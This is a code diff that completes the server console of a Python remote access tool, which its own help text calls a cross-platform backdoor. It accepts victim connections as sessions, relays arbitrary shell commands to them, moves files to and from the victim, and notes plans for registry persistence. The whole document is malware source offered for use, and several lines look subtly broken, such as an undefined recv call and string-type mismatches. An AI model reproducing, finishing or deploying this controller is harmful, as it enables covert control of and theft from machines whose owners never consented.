@@ -9,35 +9,59 @@
 import socket
 import json
 import threading
+import re
 
 HOST = lambda : '0.0.0.0'
-PORT = lambda : '0101'
+PORT = lambda : 101
+BasePath = lambda : '/root/Documents/'
 
 all_sockets = []
 
 class SocketHandler(threading.Thread):
 
     def __init__(self,id,name,addr,conn):
-        threading.Thread.__init__()
+        threading.Thread.__init__(self)
         self.leave = False
         self.id = id
-
-        self.name = name
-
         self.addr = addr
         self.conn = conn
+        self.conn.sendall('uname')
+        uname  = self.conn.recv(1024)
+        self.name = uname + name
 
-    def saveFile(self):
-        # TODO : get json data and write it binary
-        pass
+    def saveFile(self, jsondata, filename):
+        '''
+            downloads the file and saving it in /root/Documents
+            you can change the BasePath in top if file
+        '''
+        json_string = jsondata.decode('utf-8')
+        data_to_write = json.loads(json_string)[filename]
+        with open(file=BasePath()+self.name+'_'+filename,mode='wb') as f:
+            f.writelines(data_to_write)
 
-    def upload(self):
-        # TODO : get the path read the file and return json string
-        pass
+    def upload(self, path):
+        '''
+            should pass the absolute path from /
+        '''
+        with open(file=path, mode='rb') as f:
+            if f.readable():
+                data_to_send = f.readlines()
+                return ''.join(data_to_send)
+            else :
+                print('[-] file is not allowed to read?!?')
 
-    def sessionChoice(self):
-        # TODO : get session address(giving some info) and returning id to choose
-        pass
+    def exeCommand(self,cmnd):
+        '''
+            if cmnd is download after it waite to recv
+            if cmnd is upload first send a signal then read the file and send it
+            if cmnd is not none of these send the cmnd to do on clientside and recv answer
+            ls, dir, uname, pwd, upload, download
+            presistence(regadd)
+            print help
+        '''
+        # TODO : depends on input command switch :
+        self.conn.sendall(cmnd)
+        return self.recv(1024)
 
     def disconnect(self):
         self.leave = True
@@ -50,15 +74,53 @@ class SocketHandler(threading.Thread):
 class Handler(threading.Thread):
 
     def __init__(self):
-        threading.Thread.__init__()
+        threading.Thread.__init__(self)
+
 
     def run(self) -> None:
-        # TODO : handling user input and accessing other threads
         global all_sockets
-        prompt = 'zbits'
+        self.prompt = 'zbits'
+        self.command = ''
         while True :
-            # TODO : check the prompt
-            connected = input(prompt + '> ') # TODO : naming OS@session#>
+            user_input = input(self.prompt + '> ')
+            try :
+                sessionnumber = \
+                    re.search(r'use session %(?P<sessno>\d+)',user_input).group('sessno')
+                self.command = 'use'
+            except AttributeError:
+                if re.match(r'^\s*list\s*$',user_input):
+                    self.command = 'list'
+                elif re.match(r'^\s*help\s*$', user_input):
+                    self.command = 'help'
+                sessionnumber = None
+
+            if self.command == 'use':
+                self.connected = all_sockets[int(sessionnumber)]
+                self.prompt = self.connected.name
+                while True :
+                    user_input = input(self.prompt + '> ')
+                    if re.match(r'^\s*close\s*$', user_input) :
+                        self.connected = None
+                        break
+                    print(self.connected.exeCommand(user_input))
+            elif self.command == 'list' :
+                for client in all_sockets :
+                    print('['+client.id+'] ' + client.name)
+            elif self.command == 'help' :
+                help_string = '''
+    author : zerobits01
+    gmail  : zerobits0101@gmail.com
+    team   : Paradox-Squad
+    purpose: it's cross-platform backdoor or remote access
+    commands : 
+        help  => print this string
+        close => close the open session
+        use session# => it starts a controlling a client
+        list => lists all available sessions
+        ctrl+c => exit the program
+        in session you can run all system commands base on client OS
+                '''
+                print(help_string)
 
 
 while True:
@@ -66,16 +128,10 @@ while True:
         s.bind((HOST(),PORT()))
         s.listen()
         id = 0
-        Handler()
+        Handler().start()
         while True:
             conn, addr = s.accept()
             all_sockets.append(
-                SocketHandler(id=id,name='session %d'%(id),addr=addr,conn=conn))
+                SocketHandler(id=id,name='session%d'%(id),addr=addr,conn=conn))
+            all_sockets[id].start()
             id += 1
-
-'''
-    data = conn.recv(1024)
-            if not data:
-                break
-            conn.sendall(data)
-'''
